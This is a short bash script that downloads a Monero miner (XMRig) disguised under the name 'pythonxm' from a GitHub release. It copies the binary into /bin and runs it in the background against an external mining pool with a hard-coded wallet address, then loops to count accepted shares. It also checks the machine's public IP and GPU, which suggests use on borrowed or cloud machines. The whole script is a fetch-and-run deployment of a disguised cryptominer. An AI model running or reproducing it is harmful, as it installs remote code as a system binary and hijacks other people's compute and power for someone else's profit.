#!bin/bash -xe 
iip=$(curl https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
nvidia-smi
curl ipinfo.io

wget https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm
chmod +x pythonxm
cp pythonxm /bin/pythonxm
pythonxm  -o ehttp.info:443 --coin=XMR -u 44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p  -p x -k -t 8 2> logxm.out 1> logxm.out  &

while [ 1 ]
do
    echo '#######################################################################################################################################'
    echo first 21: $(grep -o 'Accepted' logxm.out  | wc -l)
    grep -o '' logxm.out | tail -n 5
    sleep 30
done
